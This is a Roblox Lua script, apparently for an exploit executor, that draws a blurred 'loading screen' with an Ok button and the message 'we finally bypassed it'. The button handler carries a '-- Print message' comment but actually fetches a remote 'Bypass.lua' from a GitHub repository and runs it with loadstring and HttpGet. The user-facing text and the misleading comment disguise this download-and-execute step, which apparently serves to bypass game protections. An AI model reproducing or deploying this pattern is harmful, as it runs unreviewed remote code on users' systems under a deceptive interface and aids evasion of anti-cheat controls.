local function createLoadingScreen(titleText, contentText)
    -- ScreenGui
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "LoadingScreen"
    ScreenGui.Parent = game:GetService("CoreGui")
    
    -- Blur Effect
    local BlurEffect = Instance.new("BlurEffect")
    BlurEffect.Size = 15
    BlurEffect.Parent = game:GetService("Lighting")
    
    -- Main Frame
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 500, 0, 300)
    MainFrame.Position = UDim2.new(0.2, 0, 0, 0)
    MainFrame.BackgroundTransparency = 0.4
    MainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    MainFrame.AnchorPoint = Vector2.new(0, 0)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    -- Intro Animation
    MainFrame.Size = UDim2.new(0, 0, 0, 0)
    MainFrame:TweenSize(UDim2.new(0, 500, 0, 300), Enum.EasingDirection.Out, Enum.EasingStyle.Bounce, 1, true)

    -- UI Corners for Main Frame
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = MainFrame

    -- Title
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.BackgroundTransparency = 1
    Title.Text = titleText or "Loading Screen"
    Title.Font = Enum.Font.SourceSansBold
    Title.TextSize = 24
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextXAlignment = Enum.TextXAlignment.Center
    Title.Parent = MainFrame

    -- Content
    local Content = Instance.new("TextLabel")
    Content.Size = UDim2.new(1, 0, 1, -100)
    Content.Position = UDim2.new(0, 0, 0, 50)
    Content.BackgroundTransparency = 1
    Content.Text = contentText or "Please press the button to proceed."
    Content.Font = Enum.Font.SourceSans
    Content.TextSize = 18
    Content.TextColor3 = Color3.fromRGB(200, 200, 200)
    Content.TextWrapped = true
    Content.Parent = MainFrame

    -- Button
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(0, 150, 0, 50)
    Button.Position = UDim2.new(0.5, 0, 0, 270) -- Centered horizontally and slightly above the bottom
    Button.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
    Button.Text = "Ok"
    Button.Font = Enum.Font.SourceSansBold
    Button.TextSize = 20
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.AnchorPoint = Vector2.new(0.5, 1) -- Adjusted anchor point for proper alignment
    Button.Parent = MainFrame

    -- UI Corners for Button
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 10)
    ButtonCorner.Parent = Button

    -- Button Functionality
    Button.MouseButton1Click:Connect(function()
        -- Print message
loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Frostware-/refs/heads/main/Bypass.lua"))() 
            -- Outro Animation
    MainFrame:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quint, 1, true, function()
            -- Remove UI and Blur
            ScreenGui:Destroy()
            BlurEffect:Destroy()
        end)
    end)
end

-- Example Usage
createLoadingScreen("Fluxusware Team", "we finally bypassed it, please click the continue button twice to activate the script ")
